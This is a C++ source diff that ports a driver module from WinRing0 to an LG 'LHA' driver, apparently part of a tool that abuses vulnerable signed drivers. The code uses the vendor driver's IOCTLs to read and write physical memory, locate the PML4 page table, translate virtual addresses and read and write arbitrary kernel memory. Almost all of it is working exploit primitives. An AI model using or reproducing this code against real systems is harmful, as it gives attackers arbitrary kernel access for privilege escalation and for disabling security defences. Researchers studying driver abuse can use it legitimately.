@@ -2,13 +2,13 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2020 - 2021
 *
-*  TITLE:       WINRING0.CPP
+*  TITLE:       LHA.CPP
 *
 *  VERSION:     1.10
 *
 *  DATE:        15 Apr 2021
 *
-*  WinRing0 based drivers routines.
+*  LG LHA driver routines.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -18,31 +18,36 @@
 *******************************************************************************/
 
 #include "global.h"
-#include "idrv/winring0.h"
+#include "idrv/lha.h"
+
+//
+// WARNING, (BUG)FEATURE ALERT
+// 
+// LG crapware does not check API call results.
+// This will eventually lead to BSOD in case of mapping failure.
+//
 
 /*
-* WRZeroReadPhysicalMemory
+* LHAReadPhysicalMemory
 *
 * Purpose:
 *
 * Read physical memory through MmMapIoSpace.
 *
 */
-BOOL WRZeroReadPhysicalMemory(
+BOOL WINAPI LHAReadPhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes
-)
+    _In_ ULONG NumberOfBytes)
 {
-    OLS_READ_MEMORY_INPUT request;
+    LHA_READ_PHYSICAL_MEMORY request;
 
-    request.Address.QuadPart = PhysicalAddress;
-    request.UnitSize = 1;
-    request.Count = NumberOfBytes;
+    request.Address = PhysicalAddress;
+    request.Size = NumberOfBytes;
 
     return supCallDriver(DeviceHandle,
-        IOCTL_OLS_READ_MEMORY,
+        IOCTL_LHA_READ_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         Buffer,
@@ -50,14 +55,14 @@ BOOL WRZeroReadPhysicalMemory(
 }
 
 /*
-* WRZeroWritePhysicalMemory
+* LHAWritePhysicalMemory
 *
 * Purpose:
 *
 * Write to physical memory.
 *
 */
-BOOL WINAPI WRZeroWritePhysicalMemory(
+BOOL WINAPI LHAWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
@@ -67,25 +72,24 @@ BOOL WINAPI WRZeroWritePhysicalMemory(
     SIZE_T size;
     ULONG value;
     DWORD dwError = ERROR_SUCCESS;
-    OLS_WRITE_MEMORY_INPUT* pRequest;
+    LHA_WRITE_PHYSICAL_MEMORY* pRequest;
 
-    value = FIELD_OFFSET(OLS_WRITE_MEMORY_INPUT, Data) + NumberOfBytes;
+    value = FIELD_OFFSET(LHA_WRITE_PHYSICAL_MEMORY, Data) + NumberOfBytes;
     size = ALIGN_UP_BY(value, PAGE_SIZE);
 
-    pRequest = (OLS_WRITE_MEMORY_INPUT*)VirtualAlloc(NULL, size, 
+    pRequest = (LHA_WRITE_PHYSICAL_MEMORY*)VirtualAlloc(NULL, size,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (pRequest) {
 
         if (VirtualLock(pRequest, size)) {
 
-            pRequest->Address.QuadPart = PhysicalAddress;
-            pRequest->UnitSize = 1;
-            pRequest->Count = NumberOfBytes;
+            pRequest->Address = PhysicalAddress;
+            pRequest->Size = NumberOfBytes;
             RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);
 
             bResult = supCallDriver(DeviceHandle,
-                IOCTL_OLS_WRITE_MEMORY,
+                IOCTL_LHA_WRITE_PHYSICAL_MEMORY,
                 pRequest,
                 (ULONG)size,
                 NULL,
@@ -107,34 +111,35 @@ BOOL WINAPI WRZeroWritePhysicalMemory(
 }
 
 /*
-* WRZeroQueryPML4Value
+* LHAQueryPML4Value
 *
 * Purpose:
 *
 * Locate PML4.
 *
 */
-BOOL WINAPI WRZeroQueryPML4Value(
+BOOL WINAPI LHAQueryPML4Value(
     _In_ HANDLE DeviceHandle,
     _Out_ ULONG_PTR* Value)
 {
     DWORD dwError = ERROR_SUCCESS;
     ULONG_PTR PML4 = 0;
     UCHAR* pbLowStub1M;
+    DWORD cbRead = 0x100000;
 
     *Value = 0;
 
     do {
 
-        pbLowStub1M = (UCHAR*)supHeapAlloc(0x100000);
+        pbLowStub1M = (UCHAR*)supHeapAlloc(cbRead);
         if (pbLowStub1M == NULL) {
             dwError = GetLastError();
             break;
         }
 
-        for (ULONG_PTR i = 0; i < 0x100000; i += PAGE_SIZE) {
+        for (ULONG_PTR i = 0; i < cbRead; i += PAGE_SIZE) {
 
-            if (!WRZeroReadPhysicalMemory(DeviceHandle,
+            if (!LHAReadPhysicalMemory(DeviceHandle,
                 i,
                 RtlOffsetToPointer(pbLowStub1M, i),
                 PAGE_SIZE))
@@ -165,34 +170,34 @@ BOOL WINAPI WRZeroQueryPML4Value(
 }
 
 /*
-* WRZeroVirtualToPhysical
+* LHAVirtualToPhysical
 *
 * Purpose:
 *
 * Translate virtual address to the physical.
 *
 */
-BOOL WINAPI WRZeroVirtualToPhysical(
+BOOL WINAPI LHAVirtualToPhysical(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
 {
     return PwVirtualToPhysical(DeviceHandle,
-        WRZeroQueryPML4Value,
-        WRZeroReadPhysicalMemory,
+        LHAQueryPML4Value,
+        LHAReadPhysicalMemory,
         VirtualAddress,
         PhysicalAddress);
 }
 
 /*
-* WRZeroReadKernelVirtualMemory
+* LHAReadKernelVirtualMemory
 *
 * Purpose:
 *
 * Read virtual memory.
 *
 */
-BOOL WINAPI WRZeroReadKernelVirtualMemory(
+BOOL WINAPI LHAReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -201,13 +206,13 @@ BOOL WINAPI WRZeroReadKernelVirtualMemory(
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
 
-    bResult = WRZeroVirtualToPhysical(DeviceHandle,
+    bResult = LHAVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = WRZeroReadPhysicalMemory(DeviceHandle,
+        bResult = LHAReadPhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes);
@@ -218,14 +223,14 @@ BOOL WINAPI WRZeroReadKernelVirtualMemory(
 }
 
 /*
-* WRZeroKernelVirtualMemory
+* LHAWriteKernelVirtualMemory
 *
 * Purpose:
 *
 * Write virtual memory.
 *
 */
-BOOL WINAPI WRZeroKernelVirtualMemory(
+BOOL WINAPI LHAWriteKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
@@ -234,13 +239,13 @@ BOOL WINAPI WRZeroKernelVirtualMemory(
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
 
-    bResult = WRZeroVirtualToPhysical(DeviceHandle,
+    bResult = LHAVirtualToPhysical(DeviceHandle,
         Address,
         &physicalAddress);
 
     if (bResult) {
 
-        bResult = WRZeroWritePhysicalMemory(DeviceHandle,
+        bResult = LHAWritePhysicalMemory(DeviceHandle,
             physicalAddress,
             Buffer,
             NumberOfBytes);
